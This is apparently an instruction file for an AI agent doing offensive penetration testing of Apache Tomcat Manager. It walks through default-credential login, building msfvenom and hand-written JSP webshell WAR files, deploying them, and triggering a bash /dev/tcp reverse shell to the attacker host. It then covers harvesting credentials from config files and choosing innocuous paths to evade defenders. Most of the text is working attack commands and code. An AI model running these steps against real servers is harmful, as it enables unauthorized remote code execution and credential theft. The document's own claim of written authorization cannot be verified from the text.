# Tomcat Manager WAR Deployment

You are helping a penetration tester exploit authenticated access to Apache
Tomcat's Manager application to deploy a malicious WAR file and achieve remote
code execution. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[tomcat-manager-deploy] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## Scope Boundary

This skill covers Tomcat Manager WAR deployment — authenticating to the Manager
interface, generating a malicious WAR payload, deploying it, triggering code
execution, and catching a reverse shell. When you reach the boundary of this
scope — whether through completing your methodology or discovering findings outside your domain — **STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Context to pass (injection point, target, working payloads, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

## State Management

Call `get_state_summary()` from the state MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Exploit and Tool Transfer

Never download exploits, scripts, or tools directly to the target from the
internet (`curl https://github.com/...`, `git clone` on target). Targets may
lack outbound internet access, and operators must review files before they
reach the target.

**Attackbox-first workflow:**

1. **Download on attackbox** — `git clone`, `curl`, `searchsploit -m` locally
2. **Review** — inspect source code or binary provenance before transferring
3. **Serve** — `python3 -m http.server 8080` from the directory containing the file
4. **Pull from target** — `wget http://ATTACKBOX:8080/file -O /tmp/file` or
   `curl http://ATTACKBOX:8080/file -o /tmp/file`

**Alternatives when HTTP is not viable:** `scp`/`sftp` (if SSH exists),
`nc` file transfer, base64-encode and paste, or
`impacket-smbserver share . -smb2support` on attackbox.

**Inline source code** written via heredoc in this skill does not need this
workflow — the operator can read the code directly.

## Prerequisites

- **Tomcat Manager credentials** with `manager-script` or `manager-gui` role
  - From LFI: `/var/lib/tomcat{7,8,9,10}/conf/tomcat-users.xml`,
    `/opt/tomcat/conf/tomcat-users.xml`, `/etc/tomcat*/tomcat-users.xml`
  - From default creds: `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`,
    `admin:tomcat`, `manager:manager`, `role1:tomcat`
  - From config exposure: misconfigured backups, GitHub leaks, `.env` files
- **Network access** to Tomcat Manager (usually port 8080 or 80/443)
- **msfvenom** installed on attackbox (for WAR generation)
- **Tomcat Manager endpoint** — `/manager/text/` (script API) or
  `/manager/html/` (web GUI)

### Manager Role Requirements

| Role | Path | Capability |
|------|------|-----------|
| `manager-gui` | `/manager/html` | Web GUI — upload WAR via browser form |
| `manager-script` | `/manager/text` | Text API — deploy/undeploy via curl |
| `manager-jmx` | `/manager/jmxproxy` | JMX monitoring only — no deployment |
| `manager-status` | `/manager/status` | Server status only — no deployment |

Only `manager-gui` and `manager-script` allow WAR deployment. If you only have
`manager-jmx` or `manager-status`, deployment is not possible via Manager —
note this in Blocked and return.

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:

1. **Tomcat version** — check `/` or error pages for version string
2. **Manager access** — test both `/manager/text/list` and `/manager/html/`
3. **Credentials** — try provided creds or defaults
4. **Attacker IP** — determine the correct callback interface

### Verify Manager Access

```bash
# Test manager-script API (text)
curl -s -u 'USER:PASS' 'http://TARGET:8080/manager/text/list'
# Expected: "OK - Listed applications for virtual host ..."

# Test manager-gui (HTML)
curl -s -o /dev/null -w '%{http_code}' -u 'USER:PASS' 'http://TARGET:8080/manager/html'
# Expected: 200
```

### Determine Attacker IP

Use the correct network interface for reverse shell callbacks. Prefer VPN/tunnel
interfaces over NAT adapters:

```bash
# Prefer tun0 (VPN), fall back to first non-loopback IP
LHOST=$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+') || \
LHOST=$(hostname -I | awk '{print $1}')
echo "Callback IP: $LHOST"
```

**Common mistakes:**
- Using NAT adapter IP (10.0.2.15, 192.168.x.x) when on VPN — target can't
  reach it
- Using Docker bridge IP (172.17.x.x)
- Verify with: `ping -c1 $LHOST` from target context if possible

### Password Special Characters

Tomcat passwords often contain shell metacharacters (`!`, `$`, `&`, etc.).
When using `curl -u`, these must be handled carefully:

```bash
# Option 1: Single-quote the -u argument (prevents shell expansion)
curl -u 'tomcat:P@$$w0rd!' ...

# Option 2: Use Authorization header directly (most reliable)
# Base64-encode user:pass
AUTH=$(echo -n 'tomcat:P@$$w0rd!' | base64)
curl -H "Authorization: Basic $AUTH" ...

# Option 3: URL-encode special chars in the URL itself
curl 'http://tomcat:P%40%24%24w0rd%21@TARGET:8080/manager/text/list'
```

**`!` in double quotes** is especially problematic — bash interprets it as
history expansion. Always use single quotes or the Authorization header method.

## Step 2: Generate WAR Payload

### msfvenom JSP Reverse Shell (Recommended)

```bash
# Standard JSP reverse shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war \
  -o /tmp/claude-1000/shell.war

# Alternative: Java meterpreter (if using Metasploit handler)
msfvenom -p java/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f war \
  -o /tmp/claude-1000/shell.war

# Staged variant (smaller payload, needs Metasploit handler)
msfvenom -p java/shell/reverse_tcp LHOST=$LHOST LPORT=4444 -f war \
  -o /tmp/claude-1000/shell.war
```

### Manual JSP Webshell WAR (No msfvenom)

If msfvenom is not available, create a WAR manually:

```bash
# Create a command execution JSP
mkdir -p /tmp/claude-1000/wardir
cat > /tmp/claude-1000/wardir/cmd.jsp << 'JSPEOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) out.println(line);
}
%>
JSPEOF

# Package as WAR
cd /tmp/claude-1000/wardir && jar -cvf /tmp/claude-1000/cmd.war cmd.jsp
```

### Verify WAR Contents

```bash
# List WAR contents to confirm the JSP is inside
jar -tf /tmp/claude-1000/shell.war | head -10
```

## Step 3: Deploy WAR

### Method 1: Manager Text API (manager-script role)

```bash
# Deploy via PUT (Tomcat 7+)
curl -u 'USER:PASS' --upload-file /tmp/claude-1000/shell.war \
  'http://TARGET:8080/manager/text/deploy?path=/app'
# Expected: "OK - Deployed application at context path [/app]"

# Deploy via PUT with Authorization header (for special characters in password)
AUTH=$(echo -n 'USER:PASS' | base64)
curl -H "Authorization: Basic $AUTH" --upload-file /tmp/claude-1000/shell.war \
  'http://TARGET:8080/manager/text/deploy?path=/app'

# Verify deployment
curl -u 'USER:PASS' 'http://TARGET:8080/manager/text/list'
# Should show: /app:running:0:app
```

**Deploy to a non-obvious path** to reduce visibility:

```bash
# Use an innocuous name
curl -u 'USER:PASS' --upload-file /tmp/claude-1000/shell.war \
  'http://TARGET:8080/manager/text/deploy?path=/docs'
```

### Method 2: Manager HTML Interface (manager-gui role)

When only `manager-gui` is available (no `manager-script`), deploy via the
HTML form upload. This requires a multipart POST:

```bash
# Upload WAR via HTML form
curl -u 'USER:PASS' -F "deployWar=@/tmp/claude-1000/shell.war" \
  'http://TARGET:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=NONCE'
```

**CSRF token required**: The HTML interface uses CSRF protection. Extract the
nonce first:

```bash
# Get CSRF nonce from manager page
NONCE=$(curl -s -u 'USER:PASS' 'http://TARGET:8080/manager/html' | \
  grep -oP 'CSRF_NONCE=\K[A-F0-9]+' | head -1)

# Deploy with nonce
curl -u 'USER:PASS' -F "deployWar=@/tmp/claude-1000/shell.war" \
  "http://TARGET:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$NONCE"
```

### Verify Deployment

```bash
# Check via text API
curl -u 'USER:PASS' 'http://TARGET:8080/manager/text/list'

# Or check directly
curl -s -o /dev/null -w '%{http_code}' 'http://TARGET:8080/app/'
# Expected: 200
```

## Step 4: Trigger and Catch Shell

### Reverse Shell (msfvenom WAR)

1. **Start listener** on attackbox (use MCP shell-server if available):

```bash
# Via MCP shell-server (preferred)
# start_listener(port=4444, label="tomcat-war-rce")

# Via netcat fallback
nc -nlvp 4444
```

2. **Trigger the JSP** — msfvenom WAR contains a randomly named JSP inside.
   Find and request it:

```bash
# List the JSP filename inside the WAR
jar -tf /tmp/claude-1000/shell.war | grep '\.jsp$'
# Output example: scprbjej.jsp

# Trigger the reverse shell
curl 'http://TARGET:8080/app/JSPNAME.jsp'
```

If you don't know the JSP filename, request the context root — Tomcat may
auto-invoke `index.jsp` or the default servlet:

```bash
curl 'http://TARGET:8080/app/'
```

3. **Verify shell connection** — check the listener for incoming connection.

### Command Execution (Manual WAR)

For the manual `cmd.jsp` webshell:

```bash
# Execute commands
curl 'http://TARGET:8080/app/cmd.jsp?cmd=id'
curl 'http://TARGET:8080/app/cmd.jsp?cmd=whoami'

# Send reverse shell from webshell
curl --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" \
  'http://TARGET:8080/app/cmd.jsp'
```

### Stabilize Shell

After catching the reverse shell:

```bash
# Via MCP shell-server
# stabilize_shell(session_id="...")

# Manual stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

### Verify Access

```bash
id
whoami
hostname
cat /etc/os-release
```

Common Tomcat service users: `tomcat`, `tomcat8`, `tomcat9`, `www-data`

## Step 5: Cleanup

Undeploy the WAR when done to reduce footprint:

```bash
# Via text API
curl -u 'USER:PASS' 'http://TARGET:8080/manager/text/undeploy?path=/app'
# Expected: "OK - Undeployed application at context path [/app]"

# Verify removal
curl -u 'USER:PASS' 'http://TARGET:8080/manager/text/list'
```

**Clean up local files:**

```bash
rm -f /tmp/claude-1000/shell.war /tmp/claude-1000/cmd.war
rm -rf /tmp/claude-1000/wardir
```

## Step 6: Escalate or Pivot

After catching a shell as the Tomcat service user:

- **Linux target**: STOP. Return to orchestrator recommending
  **linux-discovery**. Pass: hostname, current user (tomcat/tomcatN), shell
  session ID, access method (reverse shell via WAR deploy).
- **Windows target**: STOP. Return to orchestrator recommending
  **windows-discovery**. Pass: hostname, current user, shell session ID,
  access method.
- **Tomcat running as root/SYSTEM** (rare but happens): You already have
  maximum privileges. Collect evidence and report.
- **Other web apps on same Tomcat**: Check for additional applications with
  credentials or data. Read `conf/server.xml` for database connection strings.

Report in your return summary: any new credentials, access, vulns, or pivot
paths discovered.

When routing, pass along: target hostname/IP, current user, shell session ID,
Tomcat version, and any credentials found on the system.

### Post-Exploitation Quick Wins

Before routing to discovery, grab these from the Tomcat service user context:

```bash
# Tomcat config files (credentials, DB connections)
cat /var/lib/tomcat*/conf/tomcat-users.xml 2>/dev/null
cat /opt/tomcat/conf/tomcat-users.xml 2>/dev/null
cat /var/lib/tomcat*/conf/context.xml 2>/dev/null
cat /var/lib/tomcat*/conf/server.xml 2>/dev/null

# Web app configs (may contain DB creds, API keys)
find /var/lib/tomcat*/webapps -name "*.xml" -o -name "*.properties" | head -20
grep -r "password" /var/lib/tomcat*/webapps/*/WEB-INF/ 2>/dev/null | head -10

# Environment variables
env | sort
```

## Tomcat Version Differences

| Version | Manager Text Path | Default Port | Notes |
|---------|------------------|-------------|-------|
| Tomcat 7 | `/manager/text/` | 8080 | Legacy; `manager-script` role |
| Tomcat 8 | `/manager/text/` | 8080 | `manager-script` role |
| Tomcat 9 | `/manager/text/` | 8080 | `manager-script` role |
| Tomcat 10+ | `/manager/text/` | 8080 | Jakarta namespace; same API |

All versions use the same text API. WAR files are compatible across versions
(Java servlet spec is backward-compatible).

**Tomcat 7 legacy note**: Older Tomcat 7 installs may use `/manager/deploy`
instead of `/manager/text/deploy`.

## OPSEC Notes

- WAR deployment creates files on disk in `webapps/` — visible to defenders
- Manager access is logged in Tomcat access logs
- Reverse shells generate network connections visible to NIDS
- Undeploy the WAR after testing to reduce footprint
- `manager-script` API calls appear in access logs with basic auth
- Consider using an innocuous context path (`/docs`, `/examples`) to blend in

## Troubleshooting

### 401 Unauthorized on Manager

- Credentials are wrong or user lacks required role
- Check if `manager-script` or `manager-gui` role is assigned in `tomcat-users.xml`
- Try default credentials: `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`
- Some installs require the user to be in **both** a `manager-*` role and the
  `admin-gui` role

### 403 Forbidden on /manager/html

- User has `manager-script` but not `manager-gui` — use the text API instead
- Tomcat's `META-INF/context.xml` in the manager app may restrict access by IP:
  ```xml
  <Valve className="org.apache.catalina.valves.RemoteAddrValve"
         allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1" />
  ```
  If IP-restricted, the text API may also be blocked unless accessed from
  localhost. Try via AJP proxy (route to **ajp-ghostcat**) or SSRF.

### Deploy Returns "FAIL - Deploy Upload Failed"

- WAR file may be too large — check `maxPostSize` in `server.xml`
- Disk space may be full in `webapps/` directory
- Tomcat may not have write permission to `webapps/`
- Try a smaller payload: manual JSP WAR is typically <2KB vs msfvenom ~20KB

### Shell Doesn't Connect Back

- **Wrong LHOST**: Verify attacker IP is reachable from target
  (`ip -4 addr show tun0`)
- **Firewall**: Target may block outbound connections — try different ports
  (80, 443, 53 often allowed)
- **NAT**: Don't use NAT adapter IP (10.0.2.x) when on VPN
- **Payload encoding**: Ensure the JSP filename is correct when triggering
- **Try bind shell**: If outbound is blocked, use `msfvenom -p java/jsp_shell_bind_tcp`
  and connect to the target instead

### WAR Deploys but JSP Returns 404

- The context path may differ from what you specified — check with
  `manager/text/list`
- The JSP name inside the WAR is random (msfvenom) — list contents with
  `jar -tf shell.war | grep .jsp`
- Try the context root: `curl http://TARGET:8080/app/` may auto-invoke the JSP

### msfvenom Not Available

Use the manual JSP webshell from Step 2. Package it as a WAR with `jar`:
```bash
jar -cvf shell.war cmd.jsp
```
Then deploy, trigger, and send a reverse shell from the webshell.
